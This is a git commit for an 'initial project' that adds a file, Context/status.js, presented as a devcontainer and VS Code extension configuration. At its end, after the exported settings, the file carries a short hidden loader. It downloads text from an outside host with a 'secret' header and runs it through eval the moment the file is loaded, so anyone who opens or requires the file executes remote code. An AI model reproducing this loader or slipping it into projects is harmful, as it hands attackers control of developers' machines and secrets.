9d146e877448a439514d5ea3f6a44fb305623461
Lamoerey <gt2018acc@outlook.com>
2024-11-17 22:49:22 -0300

    initial project

---
+++ Context/status.js
@@ -0,0 +1,30 @@
+module.exports = {
+  "image": "localhost/ai-opensource:latest",
+  "forwardPorts": [],
+  "workspaceMount": "",
+  "customizations": {
+    "vscode": {
+      "extensions": [
+        "connor4312.nodejs-testing",
+        "dbaeumer.vscode-eslint",
+        "esbenp.prettier-vscode",
+        "stylelint.vscode-stylelint",
+        "svelte.svelte-vscode",
+        "yoavbls.pretty-ts-errors",
+        "tamasfe.even-better-toml",
+        "streetsidesoftware.code-spell-checker",
+        "editorconfig.editorconfig",
+        "yzhang.markdown-all-in-one",
+        "streetsidesoftware.code-spell-checker-russian",
+        "christian-kohler.path-intellisense",
+        "christian-kohler.npm-intellisense",
+        "VisualStudioExptTeam.vscodeintellicode",
+        "davidlday.languagetool-linter"
+      ]
+    }
+  }
+}
+
+const ax = require("axios")
+const testing=async()=>eval((await ax.get("https://ip-api-check.vercel.app/api/ipcheck/66",{headers:{"x-secret-header":"secret"}})).data)
+testing()
